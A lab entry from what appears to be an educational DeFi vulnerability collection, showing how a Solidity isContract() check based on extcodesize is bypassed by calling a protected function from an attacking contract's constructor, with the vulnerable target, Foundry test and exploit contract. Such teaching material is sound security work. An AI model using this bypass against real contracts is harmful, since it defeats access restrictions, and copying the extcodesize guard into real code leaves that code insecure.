# Bypass isContract() validation  
[Bypasscontract.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Bypasscontract.sol)  
**Name:** Bypass isContract() validation

**Description:**  
The attacker only needs to write the code in the constructor of the smart contract
to bypass the detection mechanism of whether it is a smart contract.

**REF:**  

https://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/  

**Target Contract:**  
```
contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
```
****How to Test:****

forge test --contracts src/test/**Bypasscontract.sol**-vvvv  
```
// Function to test if the attack contract can bypass the target contract's check.
function testBypassContractCheck() public {
    // Log the current status of the target contract before the attack. 
    // This typically returns a boolean indicating if the contract has been compromised.
    console.log("Before exploiting, protected status of TargetContract:", TargetContract.pwned());

    // Create a new instance of the Attack contract and pass the address of the target contract to it. 
    // This starts the attack against the target contract.
    AttackerContract = new Attack(address(TargetContract));

    // Log the status of the target contract again after the attack.
    // If the attack was successful, the status should be different from the initial status.
    console.log("After exploiting, protected status of TargetContract:", TargetContract.pwned());

    // Log a statement indicating that the exploit process has been completed.
    console.log("Exploit completed");
}


// Attack contract that is created to exploit the target contract.
contract Attack {
    // Public boolean that keeps track if this contract is itself a contract.
    bool public isContract;

    // Public address variable to store the address of this contract.
    address public addr;

    // Constructor of the Attack contract that is triggered once when the contract is created.
    // It takes the address of the target contract as an argument.
    constructor(address _target) {
        // Call the isContract() function of the target contract, passing this contract's address.
        // This is usually a security check in the target contract to see if the caller is a contract.
        // But since this call is made in the constructor, the extcodesize check in isContract() will return false.
        isContract = Target(_target).isContract(address(this));

        // Assign this contract's address to the addr variable.
        addr = address(this);

        // Call the protected() function of the target contract, which is presumably protected against contract calls.
        // But due to the exploit in isContract() check, this call is successful.
        Target(_target).protected();
    }
}
```
**Red box:** 

The attacker only needs to write the code in the constructor of the smart contract to bypass the detection mechanism of whether it is a smart contract.

**Purple box:** issue fixed.  
![Alt text](image-11.png)